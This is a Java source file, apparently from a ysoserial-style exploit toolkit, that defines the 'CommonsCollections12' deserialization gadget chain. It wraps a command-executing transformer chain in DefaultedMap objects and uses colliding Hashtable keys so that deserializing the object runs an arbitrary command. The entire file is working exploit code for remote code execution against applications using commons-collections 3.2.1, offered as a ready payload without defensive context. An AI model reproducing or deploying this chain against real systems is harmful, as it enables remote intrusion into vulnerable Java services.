package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.DefaultedMap;

import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * DefaultedMap 替代 LazyMap，CC 4.0 也可以同样替换
 *
 * @author su18
 */
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections12 implements CommandObjectPayload<Hashtable>
{

	public Hashtable getObject(final String command) throws Exception {

		final Transformer[]       transformers        = Gadgets.makeTransformer(command);
		Map                       hashMap1            = new HashMap();
		Map                       hashMap2            = new HashMap();
		Class<DefaultedMap>       d                   = DefaultedMap.class;
		Constructor<DefaultedMap> declaredConstructor = d.getDeclaredConstructor(Map.class, Object.class);
		declaredConstructor.setAccessible(true);
		DefaultedMap defaultedMap1 = declaredConstructor.newInstance(hashMap1, transformers);
		DefaultedMap defaultedMap2 = declaredConstructor.newInstance(hashMap2, transformers);

		defaultedMap1.put("yy", 1);
		defaultedMap2.put("zZ", 1);
		Hashtable hashtable = new Hashtable();
		hashtable.put(defaultedMap1, 1);
		hashtable.put(defaultedMap2, 1);
		defaultedMap2.remove("yy");

		return hashtable;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections12.class, args);
	}
}

